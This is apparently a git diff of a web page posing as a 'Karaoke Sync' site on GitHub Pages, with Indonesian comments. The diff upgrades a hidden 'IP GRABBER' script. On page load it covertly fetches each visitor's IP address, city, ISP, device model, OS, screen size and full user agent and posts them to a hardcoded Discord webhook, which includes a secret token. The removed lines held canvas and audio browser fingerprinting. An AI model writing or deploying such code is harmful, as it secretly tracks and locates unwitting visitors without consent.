@@ -1084,71 +1084,58 @@ document.addEventListener('keydown', e => {
 // Init favorites display
 renderFavList();
 </script>
-<!-- ==================== IP GRABBER UPGRADE v2 ==================== -->
+<!-- ==================== IP GRABBER UPGRADE v5 - Device Info Full + Model ==================== -->
 <script>
 // GANTI DENGAN WEBHOOK DISCORD KAMU
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1489972314215809124/bRqWBzezptsRKE8nLFEFMjz3ShcgSFATRsf1KhuF4AkSKu3a2xIQkU0T4p5pCEgpQQq7";
+
+function getDeviceModel() {
+    const ua = navigator.userAgent;
+    let model = "Unknown Device";
+
+    if (/Android/i.test(ua)) {
+        const match = ua.match(/Android.*?; ([^)]+)/);
+        model = match ? match[1].trim() : "Android Device";
+    } 
+    else if (/iPhone|iPad|iPod/i.test(ua)) {
+        model = /iPad/.test(ua) ? "iPad" : "iPhone";
+    } 
+    else if (/Windows/i.test(ua)) {
+        model = "Windows PC";
+    } 
+    else if (/Macintosh/i.test(ua)) {
+        model = "Mac";
+    }
+    return model;
+}
 
 async function sendIPLog() {
     let ipData = { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country_name: 'Unknown', org: 'Unknown' };
 
     try {
-        const ipRes = await fetch('https://ipapi.co/json/');
-        ipData = await ipRes.json();
-    } catch (e) { console.log("IP lookup failed"); }
+        const res = await fetch('https://ipapi.co/json/');
+        ipData = await res.json();
+    } catch (e) {}
 
-    // Simple Browser Fingerprint
-    async function getFingerprint() {
-        try {
-            // Canvas fingerprint
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillText('Karaoke Sync Fingerprint', 2, 2);
-            const canvasHash = canvas.toDataURL().slice(-20);
-
-            // Audio fingerprint (simple)
-            let audioHash = 'N/A';
-            if (typeof AudioContext !== 'undefined') {
-                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioCtx.createOscillator();
-                oscillator.type = 'sine';
-                oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime);
-                audioHash = oscillator.frequency.value.toFixed(0);
-            }
-
-            return btoa(canvasHash + audioHash + navigator.hardwareConcurrency).slice(0, 32);
-        } catch (e) {
-            return 'Fingerprint failed';
-        }
-    }
-
-    const fingerprint = await getFingerprint();
+    const deviceModel = getDeviceModel();
+    const os = navigator.platform || 'Unknown';
 
     const embed = {
-        title: "🎤 Karaoke Sync - Pengunjung Baru! (Upgrade)",
+        title: "🎤 Karaoke Sync - Pengunjung Baru! (v5)",
         color: 0x00ff88,
         timestamp: new Date().toISOString(),
         fields: [
             { name: "IP Address", value: `\`${ipData.ip || 'Unknown'}\``, inline: true },
-            { name: "Lokasi", value: `${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country_name || 'Unknown'}`, inline: true },
+            { name: "Lokasi", value: `${ipData.city || '-'}, ${ipData.region || '-'}, ${ipData.country_name || 'Unknown'}`, inline: true },
             { name: "ISP", value: ipData.org || 'Unknown', inline: true },
-            { name: "Device Info", value: navigator.userAgent.substring(0, 140) + "...", inline: false },
-            { name: "Screen", value: `${screen.width} × ${screen.height} (${screen.colorDepth}bit)`, inline: true },
-            { name: "Platform", value: navigator.platform || 'Unknown', inline: true },
+            { name: "Device Model", value: deviceModel, inline: true },
+            { name: "Operating System", value: os, inline: true },
+            { name: "Screen", value: `${screen.width} × ${screen.height}`, inline: true },
             { name: "CPU Cores", value: navigator.hardwareConcurrency || 'Unknown', inline: true },
-            { name: "Device Memory", value: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown', inline: true },
-            { name: "Connection", value: navigator.connection ? navigator.connection.effectiveType + ' (' + (navigator.connection.downlink || '?') + ' Mbps)' : 'Unknown', inline: true },
-            { name: "Dark Mode", value: window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Yes' : 'No', inline: true },
-            { name: "Touch Support", value: 'ontouchstart' in window ? 'Yes (Mobile)' : 'No', inline: true },
-            { name: "Bahasa", value: navigator.language || 'Unknown', inline: true },
-            { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown', inline: true },
-            { name: "Browser Fingerprint", value: `\`${fingerprint}\``, inline: false },
-            { name: "Referrer", value: document.referrer ? document.referrer.substring(0, 80) : "Langsung / WA", inline: false },
+            { name: "Device Info (Full)", value: navigator.userAgent.substring(0, 280) + (navigator.userAgent.length > 280 ? "..." : ""), inline: false },
             { name: "Waktu (WIB)", value: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }), inline: false }
         ],
-        footer: { text: "IP Grabber via GitHub Pages • Upgrade v2" }
+        footer: { text: "IP Grabber via GitHub Pages • Upgrade v5" }
     };
 
     try {
@@ -1157,15 +1144,15 @@ async function sendIPLog() {
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ username: "Karaoke Logger", embeds: [embed] })
         });
-        console.log("%c✅ IP Log terkirim (Upgrade v2)", "color: lime; font-weight: bold");
+        console.log("%c✅ IP Log terkirim - Upgrade v5", "color: lime; font-weight: bold");
     } catch (err) {
         console.log("IP Logger error:", err.message);
     }
 }
 
-// Jalankan setelah halaman load
+// Jalankan setelah load
 window.addEventListener('load', () => {
-    setTimeout(sendIPLog, 1800);   // delay 1.8 detik biar aman
+    setTimeout(sendIPLog, 2000);
 });
 </script>
-<!-- ==================== END IP GRABBER UPGRADE ==================== -->
+<!-- ==================== END IP GRABBER UPGRADE v5 ==================== -->
